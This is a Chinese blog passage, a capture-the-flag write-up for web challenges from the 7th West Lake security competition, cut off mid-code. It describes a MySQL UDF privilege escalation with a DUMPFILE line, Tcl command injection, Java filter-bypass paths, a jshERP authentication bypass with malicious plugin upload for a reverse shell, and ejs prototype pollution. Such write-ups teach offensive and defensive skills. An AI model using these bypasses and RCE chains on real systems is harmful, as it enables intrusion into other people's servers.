<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>第七届 杭州西湖论剑网络安全大赛 Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="第七届 杭州西湖论剑网络安全大赛 Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/02/12/%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-02-12T07:02:56.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>February</span>
            <span>12,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">第七届 杭州西湖论剑网络安全大赛 Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><strong>WEB</strong></h3><h4 id="1-only-sql"><a href="#1-only-sql" class="headerlink" title="1.only_sql"></a>1.only_sql</h4><p>考点就是Mysql client任意文件读取，然后配合UDF去提权。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610147246-70930857-7131-43c3-a0e1-95d0c8db32c2.png#averageHue=%23a89d82&clientId=u7049ab65-8d88-4&from=paste&height=824&id=ucbdaaa17&originHeight=1030&originWidth=1630&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=281410&status=done&style=none&taskId=uceccb9ed-92f5-42b7-8080-f94193a39d3&title=&width=1304" alt="image.png"><br>evil mysql读取到了密码，然后可以登录密码执行sql语句<br><code>show variables like &#39;%plugin%&#39;;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610218177-18e45074-a15c-491b-9399-ec34dd9e1430.png#averageHue=%23f1f0f0&clientId=u7049ab65-8d88-4&from=paste&height=382&id=u84235459&originHeight=478&originWidth=870&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41048&status=done&style=none&taskId=u8d521610-418e-457d-8920-524eea6d828&title=&width=696" alt="image.png"><br>获取到plugin目录位置<code>/usr/lib/mysql/p1ugin/</code><br>udf提权即可<br>参考国光师傅的<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">&lt;</span>udf.so的十六进制<span class="operator">&gt;</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/p1ugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610276491-5c282747-f3ec-4063-be2a-e23cfa7873fd.png#averageHue=%23f2f0ef&clientId=u7049ab65-8d88-4&from=paste&height=819&id=ucd17f2c3&originHeight=1024&originWidth=1445&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=197596&status=done&style=none&taskId=u2f9dd7d8-a844-4a56-8a9b-e99a5796ecc&title=&width=1156" alt="image.png"></p>
<h4 id="2-ezinject"><a href="#2-ezinject" class="headerlink" title="2.ezinject"></a>2.ezinject</h4><p>tcl的命令注入，加上一个git泄露，java权限绕过<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610374918-29546ae4-0db4-45d5-a124-deb54dd2553a.png#averageHue=%23292d35&clientId=u7049ab65-8d88-4&from=paste&height=504&id=u19c51c13&originHeight=630&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=111656&status=done&style=none&taskId=u290a13b4-13d6-48e3-9552-540b6ba8f92&title=&width=1000" alt="image.png"><br>根据git源码，我们知道假如进入了异常处理就会给<code>isloginOk</code>赋值为false，这样isloginOk就不是null了，我们就可以去访问exec路由了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610418800-1208eee0-d54e-48be-bac0-0c99ad194448.png#averageHue=%23292d35&clientId=u7049ab65-8d88-4&from=paste&height=444&id=ucc4837f8&originHeight=555&originWidth=1256&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62224&status=done&style=none&taskId=uf4d53692-579d-4e39-8929-7e4decf92cb&title=&width=1004.8" alt="image.png"><br>但是还有个过滤器，就是我们需要用<code>/exec;.js</code>这样的形式去访问即可。接下来就是复现过程<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610534553-b16bd23e-8552-42b7-b6bc-a3e2fc7734ee.png#averageHue=%23ae7c49&clientId=u7049ab65-8d88-4&from=paste&height=465&id=u1f25f57c&originHeight=581&originWidth=1730&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=95217&status=done&style=none&taskId=u5f229acd-3b91-41c9-bd34-f3749ac2342&title=&width=1384" alt="image.png"><br>将UserAgent请求头去掉获取一个合法Cookie<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610561832-df764dc2-e3e6-4a5e-9723-f0618d14a38e.png#averageHue=%232c2c2c&clientId=u7049ab65-8d88-4&from=paste&height=497&id=u4c52c16e&originHeight=621&originWidth=1464&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71019&status=done&style=none&taskId=ua382b90a-6084-4e1b-946d-7671677a767&title=&width=1171.2" alt="image.png"><br>成功访问到exec路由，最后是一个tcl命令注入<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610672386-4bfde3a1-9f4f-40b9-bd73-5b7bb7150597.png#averageHue=%2396905e&clientId=u629cd1e1-2d7e-4&from=paste&height=864&id=u2b3e3cf5&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=143030&status=done&style=none&taskId=u75cc2143-8943-4431-a790-fd0d72d4016&title=&width=1536" alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/tclsh</span></span><br><span class="line"></span><br><span class="line">set password [lindex $argv 0]</span><br><span class="line">set host [lindex $argv 1]</span><br><span class="line">set port [lindex $argv 2]</span><br><span class="line">set dir [lindex $argv 3]</span><br><span class="line">puts $argv</span><br><span class="line">eval spawn ssh -p $port $host test -d $dir &amp;&amp; echo exists</span><br><span class="line">expect &quot;*(yes/no*)?*$&quot; &#123; send &quot;yes\n&quot; &#125;</span><br><span class="line">set timeout 600</span><br><span class="line">expect &quot;*assword:*$&quot; &#123; send &quot;$password\n&quot; &#125; \</span><br><span class="line">timeout &#123; exit 1 &#125;</span><br><span class="line">set timeout -1</span><br><span class="line">expect &quot;\\$ $&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>call.sh的内容如上，我们能够做的就是传入$host、$port、$dir，passwd在命令初始化已经传入，就是1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706626835258-eb8ee24b-c89e-4b1d-805d-82b3cc5ff359.png#averageHue=%23292d36&clientId=u15eb3ee9-f9b5-4&from=paste&height=227&id=u43d1f593&originHeight=284&originWidth=1251&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38675&status=done&style=none&taskId=u47999b16-952c-4fa9-880c-9c778ec7174&title=&width=1000.8" alt="image.png"><br>我们需要在$host做到命令注入<br>这里的命令注入有点需要fuzz出来<br>我们需要让args的参数展开在exec函数里面，这样就可以执行我们的命令了，需要注意的是用<code>\t</code>代替空格，不知道为什么tcl的解释器有点bug，假如我运行put “\x20xx”，他得到的不是<code> xx</code>，而是乱码。。。。。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610666328-cfd21c2b-1f6a-42a4-ad3a-8a78071e6edc.png#averageHue=%23aea185&clientId=u629cd1e1-2d7e-4&from=paste&height=824&id=uc0c45b9d&originHeight=1030&originWidth=1630&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=164887&status=done&style=none&taskId=ue5f237b6-f6b2-4a9b-9eb0-9e9070bfbef&title=&width=1304" alt="image.png"></p>
<h4 id="3-ezerp"><a href="#3-ezerp" class="headerlink" title="3.ezerp"></a>3.ezerp</h4><p>华夏ERP后台插件RCE<br><a target="_blank" rel="noopener" href="https://github.com/jishenghua/jshERP/issues/99">https://github.com/jishenghua/jshERP/issues/99</a><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610763300-212e1acb-5520-4345-bfe9-2f5cd0a3868c.png#averageHue=%23fdfdfc&clientId=u629cd1e1-2d7e-4&from=paste&height=688&id=ue19086bc&originHeight=860&originWidth=1597&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=158718&status=done&style=none&taskId=ue486a24f-5ca1-4bb2-bd86-973b473e0ac&title=&width=1277.6" alt="image.png"><br>这里给出了一个任意文件上传的poc，经测试是可以的，首先是前台权限绕过。这个ERP是出题人二开过的，加了个Filter，逻辑如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610837872-1748392f-407f-4538-84d1-b306056287b7.png#averageHue=%23292d36&clientId=u629cd1e1-2d7e-4&from=paste&height=565&id=u46540e61&originHeight=706&originWidth=1551&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=129243&status=done&style=none&taskId=u1997f816-e31d-4d86-9b9f-a9fbfc615aa&title=&width=1240.8" alt="image.png"><br>想要访问的话需要包含上面的字符串，绕过方式很简单，比如<code>/user/login/../../</code>这种形式<br>然后后台发现plugin路由有这个函数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706610915071-d695d8a2-5018-4aee-9b74-892179f75080.png#averageHue=%23282d35&clientId=u629cd1e1-2d7e-4&from=paste&height=379&id=u00b8e46c&originHeight=474&originWidth=1404&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=84899&status=done&style=none&taskId=u03143833-92bc-4de8-93c1-839876c53cb&title=&width=1123.2" alt="image.png"><br>我们可以指定路径安装plugins，那么接下来思路就很明确了，首先需要登录。<br>登录的话最近爆出了个漏洞<code>/user/login/../../jshERP-boot/user/getAllList;.ico</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706621468630-6522c3c2-86dc-4c00-897d-ecd262ca9eae.png#averageHue=%23fcfafa&clientId=u629cd1e1-2d7e-4&from=paste&height=631&id=u2b76411e&originHeight=789&originWidth=1334&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=103795&status=done&style=none&taskId=u0fbe2a77-4524-4d4a-90d0-8d646034a77&title=&width=1067.2" alt="image.png"><br>md5解密后密码是123456，随之我们上传plugins<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622022406-28604361-b4a2-4660-979c-5adc13fc257a.png#averageHue=%23faf8f3&clientId=u82190a94-e18b-4&from=paste&height=766&id=ufe1967b3&originHeight=958&originWidth=1690&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=184351&status=done&style=none&taskId=u31d23db7-14eb-4bab-99f4-1d81092605c&title=&width=1352" alt="image.png"><br>成功将恶意jar包上传到了opt目录，最后install即可收到反弹shell<br>这里制作恶意插件包可以参照这个项目<br><a target="_blank" rel="noopener" href="https://gitee.com/xiongyi01/springboot-plugin-framework-parent">https://gitee.com/xiongyi01/springboot-plugin-framework-parent</a><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622066266-8fdaa0db-f65d-4445-b914-440633298477.png#averageHue=%232b2e33&clientId=u82190a94-e18b-4&from=paste&height=864&id=ucada2208&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=246956&status=done&style=none&taskId=ue18d0a41-0f20-4154-8a4a-8749b92c8a8&title=&width=1536" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622027193-f0cb44ff-7ebf-408c-88e8-52407911a73a.png#averageHue=%23fbf9f4&clientId=u82190a94-e18b-4&from=paste&height=766&id=udba4f6ef&originHeight=958&originWidth=1690&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=160486&status=done&style=none&taskId=u41b7f459-32e5-4a8c-8cbb-401cb3af079&title=&width=1352" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622030813-63c5a2f1-e6b8-4787-bf34-03d7fc1e4c02.png#averageHue=%23ada084&clientId=u82190a94-e18b-4&from=paste&height=824&id=uea9f5c69&originHeight=1030&originWidth=1630&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=172718&status=done&style=none&taskId=u1643599b-d619-40f6-ab68-0f8a870fbad&title=&width=1304" alt="image.png"></p>
<h4 id="4-Easyjs"><a href="#4-Easyjs" class="headerlink" title="4.Easyjs"></a>4.Easyjs</h4><p>任意文件读取加上ejs原型链污染rce。<br>dirsearch扫出来了下面几个路由</p>
<ul>
<li>rename</li>
<li>upload</li>
<li>list</li>
<li>file</li>
</ul>
<p>upload上传文件，list显示上传的文件和uuid，file查看文件内容，rename重命名文件<br>这里经过fuzz是发现rename和file配合起来是有个任意文件读取的。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622294737-58e02372-fa54-4d22-8097-04b8f6aff4f4.png#averageHue=%23ddc3ac&clientId=u82190a94-e18b-4&from=paste&height=177&id=ub3aafe77&originHeight=221&originWidth=957&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17255&status=done&style=none&taskId=ucd1badf0-9f40-41ef-ba0f-62ad517ecaa&title=&width=765.6" alt="image.png"><br>然后我们rename一下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622320339-055ba264-ec49-4215-b727-2cb2c1cf4bf5.png#averageHue=%237c6b92&clientId=u82190a94-e18b-4&from=paste&height=554&id=u465d4bba&originHeight=692&originWidth=827&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55134&status=done&style=none&taskId=u57020c3c-bcc2-46c4-868d-237d0a77883&title=&width=661.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622329671-93914b5d-f9c5-43ef-9973-51ea9f6fa9b4.png#averageHue=%23f8f6f6&clientId=u82190a94-e18b-4&from=paste&height=34&id=ud11b66f1&originHeight=42&originWidth=735&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3141&status=done&style=none&taskId=u104b2631-e21b-4b8b-9a44-031004783fe&title=&width=588" alt="image.png"><br>重命名成功后去file路由获取源码<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622355585-a3de9448-0805-463b-ba10-f998dd754804.png#averageHue=%23eeeae6&clientId=u82190a94-e18b-4&from=paste&height=531&id=u254c116a&originHeight=664&originWidth=1914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=263546&status=done&style=none&taskId=u24324dc7-882e-48e7-bbd0-0d5a9e5fc33&title=&width=1531.2" alt="image.png"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> _= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&quot;putil-merge&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">&#x27;uuid&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;value&#125; = <span class="built_in">require</span>(<span class="string">&quot;lodash/seq&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">// 将文件信息存储到全局字典中</span></span><br><span class="line"><span class="variable language_">global</span>.<span class="property">fileDictionary</span> = <span class="variable language_">global</span>.<span class="property">fileDictionary</span> || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileUpload</span>());</span><br><span class="line"><span class="comment">// 使用 body-parser 处理 POST 请求的数据</span></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"><span class="comment">// 设置模板的位置</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line"><span class="comment">// 设置模板引擎</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="comment">// 静态文件（CSS）目录</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/index&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//显示上传页面</span></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> file = req.<span class="property">files</span>.<span class="property">file</span>;</span><br><span class="line">    <span class="keyword">const</span> uniqueFileName = <span class="title function_">uuidv4</span>();</span><br><span class="line">    <span class="keyword">const</span> destinationPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, file.<span class="property">name</span>);</span><br><span class="line">    <span class="comment">// 将文件写入 uploads 目录</span></span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(destinationPath, file.<span class="property">data</span>);</span><br><span class="line">    <span class="variable language_">global</span>.<span class="property">fileDictionary</span>[uniqueFileName] = file.<span class="property">name</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(uniqueFileName);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/list&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// const keys = Object.keys(global.fileDictionary);</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="variable language_">global</span>.<span class="property">fileDictionary</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/file&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">query</span>.<span class="property">uniqueFileName</span>)&#123;</span><br><span class="line">        uniqueFileName = req.<span class="property">query</span>.<span class="property">uniqueFileName</span></span><br><span class="line">        filName = <span class="variable language_">global</span>.<span class="property">fileDictionary</span>[uniqueFileName]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filName)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(__dirname+<span class="string">&quot;/uploads/&quot;</span>+filName).<span class="title function_">toString</span>())</span><br><span class="line">            &#125;<span class="keyword">catch</span> (error)&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&quot;文件不存在！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;文件不存在！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/rename&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;rename&quot;</span>)</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">oldFileName</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">newFileName</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">uuid</span>)&#123;</span><br><span class="line">        oldFileName = req.<span class="property">body</span>.<span class="property">oldFileName</span></span><br><span class="line">        newFileName = req.<span class="property">body</span>.<span class="property">newFileName</span></span><br><span class="line">        uuid = req.<span class="property">body</span>.<span class="property">uuid</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">waf</span>(oldFileName)  &amp;&amp; <span class="title function_">waf</span>(newFileName) &amp;&amp;  <span class="title function_">waf</span>(uuid))&#123;</span><br><span class="line">            uniqueFileName = <span class="title function_">findKeyByValue</span>(<span class="variable language_">global</span>.<span class="property">fileDictionary</span>,oldFileName)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> uuid);</span><br><span class="line">            <span class="keyword">if</span> (uniqueFileName == uuid)&#123;</span><br><span class="line">                <span class="title function_">putil_merge</span>(<span class="variable language_">global</span>.<span class="property">fileDictionary</span>,&#123;[uuid]:newFileName&#125;,&#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;)</span><br><span class="line">                <span class="keyword">if</span>(newFileName.<span class="title function_">includes</span>(<span class="string">&#x27;..&#x27;</span>))&#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！！！&#x27;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    fs.<span class="title function_">rename</span>(__dirname+<span class="string">&quot;/uploads/&quot;</span>+oldFileName, __dirname+<span class="string">&quot;/uploads/&quot;</span>+newFileName, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                            res.<span class="title 